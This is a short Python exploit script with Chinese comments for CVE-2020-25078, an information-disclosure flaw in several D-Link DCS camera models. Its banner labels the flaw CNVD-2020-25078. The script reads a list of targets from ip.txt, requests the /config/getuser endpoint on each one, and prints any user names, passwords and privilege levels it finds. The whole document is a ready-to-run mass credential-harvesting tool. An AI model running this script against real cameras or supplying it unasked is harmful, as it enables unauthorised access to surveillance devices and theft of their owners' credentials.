# CVE-2020-25078
# D-link 信息泄漏
# 影响版本：DCS-2530L  DCS-2670L  DCS-4603  DCS-4622  DCS-4701E  DCS-4703E  DCS-4705E  DCS-4802E  DCS-P703
import requests
import urllib3
import re

def title():
    print("+-------------------------------------------------+")
    print("+-----------    CNVD-2020-25078   ----------------+")
    print("+-----------  D-link 敏感信息泄漏    --------------+")
    print("+--------  use: python3 CNVD-2020-25078.py -------+")
    print("+--------        Author: Henry4E36         -------+")
    print("+-------------------------------------------------+")


def target_url(url):
    target_url = url +"/config/getuser?index=0"

    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
    }
    urllib3.disable_warnings()
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
        if "name" in res.text and "pass" in res.text and "priv" in res.text and res.status_code == 200:
            print("[--------------------------------------------------------------------]")
            print(f"[!] \033[31m目标监控系统: {url} 存在信息泄漏\033[0m")
            print("[!] \033[31m正在获取敏感信息.....\033[0m")
            print(f"[!]  获取的信息为:\n{res.text}")
            print("[--------------------------------------------------------------------]")
        else:
            print("[--------------------------------------------------------------------]")
            print(f"[!] \033[30m目标监控系统: {url} 不存在信息泄漏\033[0m")
            print("[--------------------------------------------------------------------]")
    except Exception as e:
        print("[--------------------------------------------------------------------]")
        print(f"[0] 目标视频监控系统:{url} 出现了意外！")
        print("[--------------------------------------------------------------------]")


if __name__ == "__main__":
    title()
    with open("ip.txt", "r") as f:
        for url in f:
            if url[:4] != "http":
                url = "http://" + url
            url=url.strip()
            target_url(url)
    f.close()
